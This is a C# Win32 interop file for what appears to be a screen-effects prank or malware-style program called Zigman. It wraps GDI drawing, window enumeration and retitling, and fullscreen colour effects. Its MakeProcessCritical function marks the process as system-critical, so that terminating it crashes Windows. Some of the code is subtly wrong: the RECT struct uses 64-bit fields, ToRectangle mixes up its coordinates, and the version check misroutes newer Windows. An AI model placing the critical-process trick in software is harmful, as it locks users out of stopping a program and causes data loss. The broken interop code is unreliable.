using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Zigman.Engine;

/// <summary>
/// Win32 API imports
/// </summary>
public class Imports
{
    /// <summary>
    /// Get display device
    /// </summary>
    /// <param name="lpszDriver">Driver</param>
    /// <param name="lpszDevice">Device</param>
    /// <param name="lpszOutput">Output</param>
    /// <param name="lpInitData">Init Data</param>
    /// <returns>Display handle</returns>
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateDC(string lpszDriver = "DISPLAY", string lpszDevice = null!, string lpszOutput = null!, string lpInitData = null!);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(int newValue, out int oldValue, int checkFlag = 0);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void NtSetInformationProcess(IntPtr handle, IntPtr type, ulong count, ulong sizeofulong = sizeof(ulong));

    /// <summary>
    /// Make current process critical
    /// </summary>
    /// <exception cref="Exception">Unsupported windows version</exception>
    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        switch (Environment.OSVersion.Version.Major) {
            case >= 6 when Environment.OSVersion.Version.Minor >= 1:
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, (IntPtr) 0x1D, 1);
                break;
            case >= 6 when Environment.OSVersion.Version.Minor >= 2:
                RtlSetProcessIsCritical(1, out _);
                break;
            case > 6:
                RtlSetProcessIsCritical(1, out _);
                break;
            default:
                throw new Exception("Unsupported windows version!");
        }
    }

    /// <summary>
    /// WIN32 RECT
    /// </summary>
    public struct WinRectangle
    {
        long left;
        long top;
        long right;
        long bottom;

        public Rectangle ToRectangle()
            => new Rectangle((int)left, (int)top, (int)bottom - (int)left, (int)top - (int)right);

        public WinRectangle(Rectangle rect)
        {
            left = rect.X;
            top = rect.Y;
            right = rect.X + rect.Width;
            bottom = rect.Y + rect.Height;
        }
    }

    /// <summary>
    /// Get window rectangle
    /// </summary>
    /// <param name="hWnd">Window handle</param>
    /// <param name="lpRect">Rectangle</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool GetWindowRect(IntPtr hWnd, out WinRectangle lpRect);
    
    /// <summary>
    /// Is the current process runnign a admin
    /// </summary>
    /// <returns>Boolean</returns>
    public static bool IsAdministrator()
    {
        bool isAdmin;
        try {
            var user = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(user);
            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
        } catch { isAdmin = false; }
        return isAdmin;
    }

    /// <summary>
    /// Make current process DPI aware
    /// </summary>
    /// <returns></returns>
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    /// <summary>
    /// Most common raster operation codes
    /// </summary>
    public enum RasterOperation : ulong
    {
        /// <summary>
        /// Fills the destination rectangle using the color
        /// associated with index 0 in the physical palette.
        /// (This color is black for the default physical palette.) 
        /// </summary>
        Blackness = 0x42,
        
        /// <summary>
        /// Fills the destination rectangle using the color
        /// associated with index 1 in the physical palette.
        /// (This color is white for the default physical palette.) 
        /// </summary>
        Whiteness = 0xFF0062,
        
        /// <summary>
        /// Combines the colors of the source and destination
        /// rectangles by using the Boolean OR operator
        /// and then inverts the resultant color. 
        /// </summary>
        NotSrcErase = 0x1100A6,
        
        /// <summary>
        /// Copies the inverted source rectangle to the destination. 
        /// </summary>
        NotSrcCopy = 0x330008,
        
        /// <summary>
        /// Combines the inverted colors of the destination rectangle
        /// with the colors of the source rectangle by using
        /// the Boolean AND operator. 
        /// </summary>
        SrcErase = 0x440328,
        
        /// <summary>
        /// Inverts the destination rectangle. 
        /// </summary>
        DstInvert = 0x550009,
        
        /// <summary>
        /// Combines the colors of the brush currently selected in hdcDest,
        /// with the colors of the destination rectangle by using
        /// the Boolean XOR operator. 
        /// </summary>
        PatInvert = 0x5A0049,
        
        /// <summary>
        /// Combines the colors of the source and destination rectangles
        /// by using the Boolean XOR operator. 
        /// </summary>
        SrcInvert = 0x660046,
        
        /// <summary>
        /// Combines the colors of the source and destination rectangles
        /// by using the Boolean AND operator. 
        /// </summary>
        SrcAnd = 0x8800C6,
        
        /// <summary>
        /// Combines the colors of the source and destination rectangles
        /// by using the Boolean OR operator. 
        /// </summary>
        MergePaint = 0xBB0226,
        
        /// <summary>
        /// Merges the colors of the source rectangle with the brush
        /// currently selected in hdcDest, by using
        /// the Boolean AND operator. 
        /// </summary>
        MergeCopy = 0xC000CA,
        
        /// <summary>
        /// Copies the source rectangle directly to the destination rectangle. 
        /// </summary>
        SrcCopy = 0xCC0020,
        
        /// <summary>
        /// Combines the colors of the source and destination
        /// rectangles by using the Boolean OR operator. 
        /// </summary>
        SrcPaint = 0xEE0086,
        
        /// <summary>
        /// Copies the brush currently selected in hdcDest,
        /// into the destination bitmap. 
        /// </summary>
        PatCopy = 0xF00021,
        
        /// <summary>
        /// Combines the colors of the brush currently selected
        /// in hdcDest, with the colors of the inverted source
        /// rectangle by using the Boolean OR operator.
        /// The result of this operation is combined with
        /// the colors of the destination rectangle by using
        /// the Boolean OR operator. 
        /// </summary>
        PatPaint = 0xFB0A09
    }
    
    /// <summary>
    /// Stretch
    /// </summary>
    /// <param name="hdcDest">Destination</param>
    /// <param name="xDest">Destination X</param>
    /// <param name="yDest">Destination Y</param>
    /// <param name="wDest">Destination width</param>
    /// <param name="hDest">Destination height</param>
    /// <param name="hdcSrc">Source</param>
    /// <param name="xSrc">Source X</param>
    /// <param name="ySrc">Source Y</param>
    /// <param name="wSrc">Source width</param>
    /// <param name="hSrc">Source height</param>
    /// <param name="rop">Raster operation codes</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("gdi32.dll")]
    public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
        IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, RasterOperation rop);
    
    /// <summary>
    /// Get system metrics
    /// </summary>
    /// <param name="smIndex">Index</param>
    /// <returns>Value</returns>
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int smIndex);

    /// <summary>
    /// Screen width
    /// </summary>
    public static readonly int Width = GetSystemMetrics(0);
    
    /// <summary>
    /// Screen height
    /// </summary>
    public static readonly int Height = GetSystemMetrics(1);

    /// <summary>
    /// Load an icon
    /// </summary>
    /// <param name="hInstance">Instance</param>
    /// <param name="lpIconName">Icon ID</param>
    /// <returns>Icon pointer</returns>
    [DllImport("user32.dll")]
    public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

    /// <summary>
    /// Get foreground window
    /// </summary>
    /// <returns>Window handle</returns>
    [DllImport("user32.dll")] 
    public static extern IntPtr GetForegroundWindow();

    /// <summary>
    /// SetWindowPos "hWndInsertAfter", should be converted to IntPtr
    /// </summary>
    public enum ZOrder
    {
        /// <summary>
        /// Places the window at the top of the Z order. 
        /// </summary>
        Top = 0,
        
        /// <summary>
        /// Places the window at the bottom of the Z order.
        /// If the hWnd parameter identifies a topmost window,
        /// the window loses its topmost status and is placed
        /// at the bottom of all other windows. 
        /// </summary>
        Bottom = 1,
        
        /// <summary>
        /// Places the window above all non-topmost windows.
        /// The window maintains its topmost position even when it is deactivated. 
        /// </summary>
        TopMost = -1,
        
        /// <summary>
        /// Places the window above all non-topmost windows
        /// (that is, behind all topmost windows).
        /// This flag has no effect if the window
        /// is already a non-topmost window.
        /// </summary>
        NoTopMost = -2
    }

    /// <summary>
    /// SetWindowPos flags
    /// </summary>
    [Flags]
    public enum SetWindowPosFlags : uint
    {
        /// <summary>
        /// Hides the window.
        /// </summary>
        Hide = 0x0080,
        
        /// <summary>
        /// Shows the window
        /// </summary>
        Show = 0x0040,
        
        /// <summary>
        /// Does not activate the window. If this flag is not set,
        /// the window is activated and moved to the top of either
        /// the topmost or non-topmost group (depending on the
        /// setting of the hWndInsertAfter parameter).
        /// </summary>
        NoActivate = 0x0010,
        
        /// <summary>
        /// Ignores X and Y parameters.
        /// </summary>
        DoNotMove = 0x0002,

        /// <summary>
        /// Does not redraw changes. If this flag is set, no repainting of any kind occurs.
        /// This applies to the client area, the nonclient area (including the title bar
        /// and scroll bars), and any part of the parent window uncovered as a result
        /// of the window being moved. When this flag is set, the application must
        /// explicitly invalidate or redraw any parts of the window and parent window
        /// that need redrawing. 
        /// </summary>
        DoNotRepaint = 0x0008,
        
        /// <summary>
        /// Prevents the window from receiving the WM_WINDOWPOSCHANGING message. 
        /// </summary>
        DoNotInform = 0x0400,
        
        /// <summary>
        /// Ignores width and height parameters.
        /// </summary>
        DoNotResize = 0x0001,
        
        /// <summary>
        /// Ignores Z order flags.
        /// </summary>
        DoNotChangeZOrder = 0x0004
    }
    
    /// <summary>
    /// Set window position
    /// </summary>
    /// <param name="hWnd">Window handle</param>
    /// <param name="hWndInsertAfter">Z order</param>
    /// <param name="x">Position X</param>
    /// <param name="y">Position Y</param>
    /// <param name="cx">New width</param>
    /// <param name="cy">New height</param>
    /// <param name="uFlags">Flags</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

    /// <summary>
    /// Draws an icon
    /// </summary>
    /// <param name="hdc">Window handler</param>
    /// <param name="xLeft">Position Y</param>
    /// <param name="yTop">Position X</param>
    /// <param name="hIcon">Icon pointer</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

    /// <summary>
    /// Screen point
    /// </summary>
    public struct Point
    {
        public int X { get; set; } 
        public int Y { get; set; }
    }
    
    /// <summary>
    /// Get cursor position
    /// </summary>
    /// <param name="lpPoint">Point</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32")]
    public static extern bool GetCursorPos(out Point lpPoint);

    /// <summary>
    /// Play a beep sound
    /// </summary>
    /// <param name="type">Sound type</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool MessageBeep(uint type);

    /// <summary>
    /// EnumWindows or EnumChildWindows delegate
    /// </summary>
    public delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

    /// <summary>
    /// Enumerate every window in a display handle
    /// </summary>
    /// <param name="i">Delegate</param>
    /// <param name="x">Display handle</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumDesktopWindowsDelegate i, IntPtr x);
 
    /// <summary>
    /// Enumerate every child window in a window in a display handle
    /// </summary>
    /// <param name="hwnd">Window handle</param>
    /// <param name="i">Delegate</param>
    /// <param name="x">Display handle</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool EnumChildWindows(IntPtr hwnd, EnumDesktopWindowsDelegate i, IntPtr x);

    /// <summary>
    /// Set window handle's text (title or it's content)
    /// </summary>
    /// <param name="hwnd">Window handle</param>
    /// <param name="lp">Title</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool SetWindowTextA(IntPtr hwnd, string lp);
    
    /// <summary>
    /// Initializes magnification
    /// </summary>
    /// <returns>Success or not</returns>
    [DllImport("Magnification.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool MagInitialize();

    /// <summary>
    /// Uninitializes magnification
    /// </summary>
    /// <returns>Success or not</returns>
    [DllImport("Magnification.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool MagUninitialize();
    
    /// <summary>
    /// Color effect
    /// </summary>
    public struct ColorEffect
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
        public float[] transform;
    }

    /// <summary>
    /// Apply a color effect for the entire screen
    /// </summary>
    /// <param name="pEffect">Color effect</param>
    /// <returns>Success or not</returns>
    [DllImport("Magnification.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool MagSetFullscreenColorEffect(ref ColorEffect pEffect);
}